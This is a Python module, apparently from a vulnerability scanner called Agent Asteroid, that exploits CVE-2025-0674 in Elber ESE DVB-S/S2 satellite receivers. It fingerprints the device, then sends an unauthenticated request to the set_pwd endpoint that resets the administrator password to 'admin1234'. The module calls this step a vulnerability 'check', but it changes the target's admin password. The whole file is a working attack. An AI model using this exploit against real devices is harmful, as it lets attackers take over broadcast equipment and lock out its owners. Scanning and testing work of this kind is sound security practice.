"""Agent Asteroid implementation for CVE-2025-0674"""

import datetime
import logging
import socket
import time

from agent import definitions, exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Elber ESE DVB-S/S2 Authentication Bypass"
VULNERABILITY_REFERENCE = "CVE-2025-0674"
VULNERABILITY_DESCRIPTION = """
A critical authentication bypass vulnerability in Elber ESE DVB-S/S2 Satellite Receiver allows attackers to reset user passwords,
including administrative accounts, by directly invoking the `set_pwd` endpoint without authentication.
"""
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=30)
TARGET_ENDPOINT = "/json_data/set_pwd?lev=2&pass=admin1234"
SUCCESSFUL_RESPONSE = "Apply successfully"
PWD_MGMT_ENDPOINT = "/modules/pwd.html"
MANAGE_SYS_PWD = "Manage system Password"


def _send_raw_request(target: definitions.Target, endpoint: str) -> str:
    """
    Sends a raw HTTP/1.1 request using sockets.
    """
    host, port = target.host, target.port
    request = (
        f"GET {endpoint} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Accept: */*\r\n"
        "\r\n"
    ).encode()

    try:
        sock = socket.create_connection((host, port), timeout=DEFAULT_TIMEOUT.seconds)
        with sock:
            sock.sendall(request)
            time.sleep(1)
            response = sock.recv(4096)
            return response.decode(errors="ignore")
    except socket.timeout:
        logging.error("Connection timed out when communicating with %s", host)
    except socket.error as e:
        logging.error("Socket error while communicating with %s: %s", host, e)
    return ""


@exploits_registry.register
class ElberAuthBypassExploit(webexploit.WebExploit):
    """
    CVE-2025-0674: Elber ESE DVB-S/S2 Authentication Bypass

    Exploit allows remote attackers to reset administrator passwords without authentication.
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Verify if the target is an Elber ESE DVB-S/S2 device.
        """
        response = _send_raw_request(target, PWD_MGMT_ENDPOINT)

        return MANAGE_SYS_PWD in response

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Check if the target is vulnerable by attempting to reset an admin password.
        """
        vulnerabilities = []

        response = _send_raw_request(target, TARGET_ENDPOINT)
        if SUCCESSFUL_RESPONSE in response:
            logging.info(
                "Vulnerability confirmed: Admin password has been reset successfully."
            )
            vuln = self._create_vulnerability(target)
            vulnerabilities.append(vuln)

        return vulnerabilities
